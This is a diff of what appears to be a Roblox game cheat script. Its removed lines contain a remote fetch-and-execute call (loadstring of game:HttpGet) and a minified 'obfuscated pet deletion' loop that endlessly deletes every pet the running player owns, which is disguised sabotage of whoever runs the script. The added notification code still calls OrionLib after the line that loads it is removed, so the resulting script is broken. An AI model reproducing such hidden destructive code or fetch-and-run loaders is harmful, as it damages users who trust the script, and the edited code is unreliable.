@@ -1,5 +1,23 @@
--- Load Orion Library
-local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/shlexware/Orion/main/source"))()
+-- Global toggle for showing notifications
+local showNotifications = false  -- Set to false to disable notifications
 
--- Obfuscated Pet Deletion Function
-local a=game:GetService("ReplicatedStorage").Packages.Knit.Services.PetService.RF;local function b()local c, d=pcall(function()return a:WaitForChild("getOwned"):InvokeServer()end)if c and d then for e, f in pairs(d)do local g={e}local h=pcall(function()a.delete:InvokeServer(unpack(g))end)if not h then warn("Failed to delete pet with ID:",e)end wait(0.1)end print("All pets have been deleted in this cycle.")else warn("Failed to retrieve pet data for deletion.")end end;while true do b()wait(0)end
+-- Example of a notification check
+if showNotifications then
+    OrionLib:MakeNotification({
+        Name = "Script Loaded",
+        Content = "AWS Halloween Script has been loaded successfully!",
+        Image = "rbxassetid://4483362458",
+        Time = 5
+    })
+end
+
+-- Replace other notification calls similarly:
+-- Example:
+if showNotifications then
+    OrionLib:MakeNotification({
+        Name = "Inventory Loaded",
+        Content = "Unlocked pets have been loaded into the selector.",
+        Image = "rbxassetid://4483362458",
+        Time = 5
+    })
+end
